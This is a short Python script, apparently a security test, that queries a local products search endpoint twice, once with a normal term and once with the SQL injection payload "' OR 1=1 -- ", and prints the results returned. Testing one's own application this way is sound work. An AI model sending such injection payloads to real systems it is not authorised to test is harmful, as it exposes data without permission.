import requests

BASE_URL = "http://127.0.0.1:8000/products"


def test_normal_search():
    response = requests.get(
        BASE_URL,
        params={"search": "Laptop"},
        timeout=5,
    )

    print("[+] Normal search")
    print(f"Status: {response.status_code}")
    print(f"Results: {len(response.json())}")


def test_sql_injection():
    payload = "' OR 1=1 -- "

    response = requests.get(
        BASE_URL,
        params={"search": payload},
        timeout=5,
    )

    results = response.json()

    print("\n[+] SQL Injection test")
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Results: {len(results)}")

    for product in results:
        print(f"- {product['name']}")


if __name__ == "__main__":
    test_normal_search()
    test_sql_injection()
